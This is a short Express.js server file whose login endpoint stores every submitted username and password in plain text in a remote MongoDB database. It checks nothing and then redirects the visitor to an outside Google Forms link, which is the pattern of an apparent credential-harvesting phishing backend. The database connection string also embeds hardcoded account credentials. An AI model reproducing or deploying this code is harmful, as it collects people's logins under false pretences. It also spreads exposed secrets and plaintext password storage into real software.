const express = require('express');
const mongoose = require('mongoose');
const bodyParser = require('body-parser');

const app = express();
const PORT = 3000;

// MongoDB connection
mongoose.connect('mongodb+srv://missari:missari123@cluster0.2uqs2.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0', {
  useNewUrlParser: true,
  useUnifiedTopology: true,
})
.then(() => console.log('Connected to MongoDB'))
.catch((error) => console.error('MongoDB connection error:', error));

// Define User schema
const userSchema = new mongoose.Schema({
  username: String,
  password: String,
});

const User = mongoose.model('User', userSchema);

// Middleware
app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static(__dirname)); // Serve static files from the root directory

// Serve index.html as the homepage
app.get('/', (req, res) => {
  res.sendFile(__dirname + '/index.html');
});

// Serve login.html when accessing /login route
app.get('/submit-form', (req, res) => {
  res.sendFile(__dirname + '/login.html');
});

// POST endpoint to handle login form submission
app.post('/submit-form', async (req, res) => {
  const { username, password } = req.body;

  // Validation for empty username or password
  if (!username || !password) {
    res.status(400).send('<h3 style="color: red;">Invalid username or password. Please try again.</h3>');
    return;
  }

  try {
    // Save user data to MongoDB
    const newUser = new User({ username, password });
    await newUser.save();

    // Redirect on success
    res.redirect('https://forms.gle/NEKUmE4s8egt6LwM8');
  } catch (error) {
    console.error('Error saving data to MongoDB:', error);
    res.status(500).send('<h3 style="color: red;">Server error. Please try again later.</h3>');
  }
});

// Start the server
app.listen(PORT, () => {
  console.log(`Server is running on http://localhost:${PORT}`);
});

